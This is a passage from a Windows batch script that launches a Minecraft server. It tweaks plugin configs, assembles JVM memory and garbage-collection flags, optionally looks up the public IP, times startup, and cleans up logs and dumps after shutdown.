if exist "%help_command_config%" if %disable_powershell% equ false %powershell_command% %powershell_arguments% "Clear-Content '%scriptdir%%help_command_config%'; Add-Content -Path '%scriptdir%%help_command_config%' -Value 'ignore-plugins:' -Force; Add-Content -Path '%scriptdir%%help_command_config%' -Value '    - All' -Force"

if exist "%help_command_config%" if %disable_help_index% equ true "%scriptdir%cache\fart.exe" -q -i -C "%help_command_config%" "#ignore-plugins:" "ignore-plugins:" > nul 2> nul
if exist "%help_command_config%" if %disable_help_index% equ false "%scriptdir%cache\fart.exe" -q -i -C "%help_command_config%" "ignore-plugins:" "#ignore-plugins:" > nul 2> nul

if exist "%help_command_config%" if %disable_help_index% equ true "%scriptdir%cache\fart.exe" -q -i -C "%help_command_config%" "#    - All" "    - All" > nul 2> nul
if exist "%help_command_config%" if %disable_help_index% equ false "%scriptdir%cache\fart.exe" -q -i -C "%help_command_config%" "    - All" "#    - All" > nul 2> nul

:: Fixes Skellet HangingEvent errors if Skellet is installed.

if exist "%skellet_config%" if %disable_powershell% equ false if %verbose_info% equ true echo Setting up skellet config...

set "skellet_config=%scriptdir%plugins\Skellet\SyntaxToggles.yml"

if exist "%skellet_config%" "%scriptdir%cache\fart.exe" -q -i -C "%skellet_config%" "Hanging: true" "Hanging: false" > nul 2> nul

::

if %unblock_files% equ true if %unblocked% equ false (
 echo.
 echo %dosya_bloklari_kaldiriliyor%

 :: n: hotspot
 if %disable_powershell% equ false start "" /b /belownormal %powershell_command% %powershell_arguments% "Start-Job -Name 'Unblock Files' -ScriptBlock { [System.Threading.Thread]::CurrentThread.Priority = 'BelowNormal'; ([System.Diagnostics.Process]::GetCurrentProcess()).PriorityClass = 'BelowNormal'; Get-ChildItem -Recurse | Unblock-File }" > nul

 set unblocked=true
)

set module_access=
if %allow_module_access% equ true set module_access= --add-opens java.base/java.lang=ALL-UNNAMED

if %sixty_four_bit_java% equ true set sixty_four_bit_java0= -d64 -Djava.vm.compressedOopsMode=64-bit
if %tiered_compilation% equ true set tiered_compilation0= -XX:+TieredCompilation

if %class_caching% equ true (
 set class_caching0= -Xshare:on -Xshareclasses
 set class_caching1= -XX:+ShareAnonymousClasses -XX+TransparentHugePage -Dcom.ibm.enableClassCaching=true
)

if %less_ram% equ false (
 rem RAM'de etkisi belirsiz oldugundan bakima alindi
 ::set less_ram0= -XX:+UseStringDeduplication
 set less_ram1= -XX:+DisableExplicitGC
) else (
 set min_ram=1M
)

if %use_secure_tls% equ true set use_secure_tls0= -Dhttps.protocols=TLSv1.3,TLSv1.2 -Dmail.smtp.ssl.protocols=TLSv1.3,TLSv1.2

if %use_server_vm% equ true set use_server_vm0= -server
if %enable_assertions% equ true set enable_assertions0= -esa -ea -Xverify:all

if %omit_stacktrace% equ true set omit_stacktrace0= -XX:+OmitStackTraceInFastThrow
if %messagebox_on_error% equ true set show_messagebox_onerror0= -XX:+ShowMessageBoxOnError

if %is_upgrading% equ true set upgrade_argument= --forceUpgrade
if %erase_cache% equ true set upgrade_argument= --forceUpgrade --eraseCache

if 4 gtr %NUMBER_OF_PROCESSORS% (
 set eventLoopThreads=%NUMBER_OF_PROCESSORS%
) else (
 set eventLoopThreads=4
)

if %verbose_info% equ true echo Setting up memory values...

for /f "skip=1 delims=" %%i in ('wmic os get freephysicalmemory /value') do for /f "delims=" %%j in ("%%i") do set "availableMemory=%%j"

set availableMemory=%availableMemory:f=%
set availableMemory=%availableMemory:r=%
set availableMemory=%availableMemory:e=%
set availableMemory=%availableMemory:e=%
set availableMemory=%availableMemory:p=%
set availableMemory=%availableMemory:h=%
set availableMemory=%availableMemory:y=%
set availableMemory=%availableMemory:s=%
set availableMemory=%availableMemory:i=%
set availableMemory=%availableMemory:c=%
set availableMemory=%availableMemory:a=%
set availableMemory=%availableMemory:l=%
set availableMemory=%availableMemory:m=%
set availableMemory=%availableMemory:e=%
set availableMemory=%availableMemory:m=%
set availableMemory=%availableMemory:o=%
set availableMemory=%availableMemory:r=%
set availableMemory=%availableMemory:y=%
set availableMemory=%availableMemory:~1%

set /a availableMemory=%availableMemory% - 1048576

if %max_ram% equ 1536M if %availableMemory% gtr 1572864 set max_ram=%availableMemory%K
if %min_ram% equ 1536M if %availableMemory% lss 1572864 if %availableMemory% gtr 0 set min_ram=%availableMemory%K

if %verbose_info% equ true echo Starting server with minimum RAM of %min_ram% and maximum of %max_ram%, code cache is %code_cache%

set aikar_flags_prefix=-D
if %use_aikars_gc_settings% equ true set aikar_flags_prefix=

:: https://github.com/aikar/timings/blob/master/src/js/ui/ServerInfo.jsx#L102
set timings_aikar_flags_workarounds0= -Dusing.aikars.flags=https://mcflags.emc.gs -Daikars.new.flags=true %aikar_flags_prefix%-XX:G1NewSizePercent=30 %aikar_flags_prefix%-XX:G1MixedGCLiveThresholdPercent=90 %aikar_flags_prefix%-XX:MaxTenuringThreshold=1 %aikar_flags_prefix%-XX:SurvivorRatio=32

:: Skips a weird JANSI error on 1.8.8, makes JANSI library DLL appear on a fixed path instead of random Temp/AppData locations and fixes JANSI version property & initialization
:: -Djansi.passthrough=true is disabled by default - may break console colors on some MC versions
set jansi_parameters=-Dlog4j.skipJansi=true -Dlibrary.jansi.version=%jar_name% -Dlibrary.jansi.path=cache -Djansi.eager=true

if %jansi_passthrough% equ true set jansi_parameters=%jansi_parameters% -Djansi.passthrough=true
if %jansi_force% equ true set jansi_parameters=%jansi_parameters% -Djansi.force=true -Dansi.force=true

:: Cleanup old leftover JANSI DLL files

if %verbose_info% equ true echo Cleaning up old leftover JANSI DLL files...

del /f /q "%scriptdir%cache\jansi*.dll" > nul 2> nul
del /f /q "%tmp%\jansi*.dll" > nul 2> nul

set cond=false
if %ip_address% equ 127.0.0.1 if %expose_ip% equ true set cond=true

if %cond% equ true (
 echo.
 echo %ip_ayarlaniyor%

 :: n: hotspot
 for /f %%l in ('%powershell_command% %powershell_arguments% "%powershell_workarounds% %powershell_new_web_client_wc% $WC.DownloadString('https://ipinfo.io/ip')"') do set "ip_address=%%l"
)

if %use_aikars_gc_settings% equ true if not %min_ram% equ %max_ram% set min_ram=%max_ram%
if %use_aikars_gc_settings% equ true set timings_aikar_flags_workarounds0=%timings_aikar_flags_workarounds0% -XX:MaxGCPauseMillis=200 -XX:+AlwaysPreTouch -XX:G1MaxNewSizePercent=40 -XX:G1HeapRegionSize=8M -XX:G1ReservePercent=20 -XX:G1HeapWastePercent=5 -XX:G1MixedGCCountTarget=4 -XX:InitiatingHeapOccupancyPercent=15 -XX:G1RSetUpdatingPauseTimePercent=5

set full_arguments=%additional_commands%-XX:+UnlockExperimentalVMOptions -XX:+IgnoreUnrecognizedVMOptions%enable_assertions0% -XX:+IdleTuningGcOnIdle%show_messagebox_onerror0%%module_access%%class_caching0%%sixty_four_bit_java0%%use_server_vm0% -Xms%min_ram% -XX:InitialHeapSize=%min_ram% -Xmx%max_ram% -XX:MaxHeapSize=%max_ram% -XX:+UseAdaptiveSizePolicy -XX:+G1UseAdaptiveIHOP -XX:+G1UseAdaptiveConcRefinement -XX:+ShowCodeDetailsInExceptionMessages -XX:ReservedCodeCacheSize=%code_cache% -XX:UseSSE=4 -XX:+UseGCOverheadLimit -XX:+UseG1GC -XX:+EnableJVMCIProduct -XX:+PerfDisableSharedMem -XX:+MaxFDLimit -XX:+RelaxAccessControlCheck -XX:+UseThreadPriorities -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.exe%tiered_compilation0% -XX:+UseFastAccessorMethods -XX:+CMSIncrementalPacing -XX:+ScavengeBeforeFullGC%less_ram0% -XX:+ParallelRefProcEnabled%omit_stacktrace0% -XX:-AggressiveOpts%less_ram1% -XX:+UseGCStartupHints%class_caching1% -XX+JITInlineWatches -Dsun.io.useCanonPrefixCache=false -Djava.net.preferIPv4Stack=true%use_secure_tls0% -Dsun.net.http.errorstream.enableBuffering=true -Dsun.net.client.defaultConnectTimeout=%connect_timeout% -Dsun.net.client.defaultReadTimeout=%read_timeout% -Dskript.dontUseNamesForSerialization=true -Djdk.http.auth.tunneling.disabledSchemes="" -Djdk.attach.allowAttachSelf -Dkotlinx.coroutines.debug=off -Djava.awt.headless=%head_less% -Dfile.encoding=UTF-8 -Dsun.jnu.encoding=UTF-8 -Dsun.stderr.encoding=UTF-8 -Dsun.stdout.encoding=UTF-8 -Duser.language=en -Duser.country=US -Duser.timezone=Europe/Istanbul -Dpaper.playerconnection.keepalive=%io_timeout% -Dnashorn.option.no.deprecation.warning=true -DPaper.IgnoreJavaVersion=true%timings_aikar_flags_workarounds0% -Dusing.flags.lifemcserver.com=true -Dusing.lifemc.flags=https://flags.lifemcserver.com -Dflags.lifemcserver.com.version="%version%" %jansi_parameters% %log4j_config_parameter%-Dio.netty.eventLoopThreads=%eventLoopThreads% -Druntime.availableProcessors=%NUMBER_OF_PROCESSORS% -Dserver.ipAddress=%ip_address% -Djava.codeCacheMem=%code_cache% -jar %jar_name%.jar "-o %online_mode%%upgrade_argument% --log-append=false --log-strip-color nogui%additional_parameters%"
if %print_java_version% equ true set full_arguments=-showversion %full_arguments%

if %verbose_info% equ true echo Starting Java with the final arguments of %full_arguments%

echo.
echo %sunucu_baslatiliyor%
echo.

set end=%time%

set options="tokens=1-4 delims=:.,"
for /f %options% %%a in ("%start%") do set start_h=%%a&set /a start_m=100%%b %% 100&set /a start_s=100%%c %% 100&set /a start_ms=100%%d %% 100
for /f %options% %%a in ("%end%") do set end_h=%%a&set /a end_m=100%%b %% 100&set /a end_s=100%%c %% 100&set /a end_ms=100%%d %% 100

set /a hours=%end_h%-%start_h%
set /a mins=%end_m%-%start_m%
set /a secs=%end_s%-%start_s%
set /a ms=%end_ms%-%start_ms%
if %ms% lss 0 set /a secs = %secs% - 1 & set /a ms = 100%ms%
if %secs% lss 0 set /a mins = %mins% - 1 & set /a secs = 60%secs%
if %mins% lss 0 set /a hours = %hours% - 1 & set /a mins = 60%mins%
if %hours% lss 0 set /a hours = 24%hours%
if 1%ms% lss 100 set ms=0%ms%

set /a totalsecs = %hours%*3600 + %mins%*60 + %secs%
if %verbose_info% equ true echo Baslama suresi %hours%:%mins%:%secs%.%ms% (%totalsecs%.%ms%s total)
if %verbose_info% equ true echo.

title %title%
%java_command% %full_arguments%

set end=%time%

set options="tokens=1-4 delims=:.,"
for /f %options% %%a in ("%start%") do set start_h=%%a&set /a start_m=100%%b %% 100&set /a start_s=100%%c %% 100&set /a start_ms=100%%d %% 100
for /f %options% %%a in ("%end%") do set end_h=%%a&set /a end_m=100%%b %% 100&set /a end_s=100%%c %% 100&set /a end_ms=100%%d %% 100

set /a hours=%end_h%-%start_h%
set /a mins=%end_m%-%start_m%
set /a secs=%end_s%-%start_s%
set /a ms=%end_ms%-%start_ms%
if %ms% lss 0 set /a secs = %secs% - 1 & set /a ms = 100%ms%
if %secs% lss 0 set /a mins = %mins% - 1 & set /a secs = 60%secs%
if %mins% lss 0 set /a hours = %hours% - 1 & set /a mins = 60%mins%
if %hours% lss 0 set /a hours = 24%hours%
if 1%ms% lss 100 set ms=0%ms%

set /a totalsecs = %hours%*3600 + %mins%*60 + %secs%
if %verbose_info% equ true echo Acik kalinan sure %hours%:%mins%:%secs%.%ms% (%totalsecs%.%ms%s total)
if %verbose_info% equ true echo.

echo %temizlik_yapiliyor%

if %auto_del_temp_files% equ true (
 if %clear_logs% equ true del /f /q .console_history > nul 2> nul

 del /f /q "%scriptdir%plugins\NoCheatPlus\*.log" > nul 2> nul
 del /f /q "%scriptdir%plugins\NoCheatPlus\*.lck" > nul 2> nul
 del /f /q "%scriptdir%plugins\NoCheatPlus\*.log.*" > nul 2> nul
 del /f /q "%scriptdir%plugins\AuthMe\authme.log" > nul 2> nul
 del /f /q "%scriptdir%plugins\bStats\temp.txt" > nul 2> nul
 del /f /q "%scriptdir%plugins\AntiAura\logs\*.*" > nul 2> nul

 if %clear_logs% equ true del /f /q "%scriptdir%logs\*.*" > nul 2> nul

 if %clear_jvm_dumps% equ true del /f /q *.mdmp > nul 2> nul
 if %clear_jvm_dumps% equ true del /f /q *.dmp > nul 2> nul
 if %clear_jvm_dumps% equ true del /f /q *.hprof > nul 2> nul
)

if %auto_restart% equ true (
 echo %yeniden_baslatiliyor%
 timeout %delay% > nul

 goto start
) else (
 endlocal
 pause
)
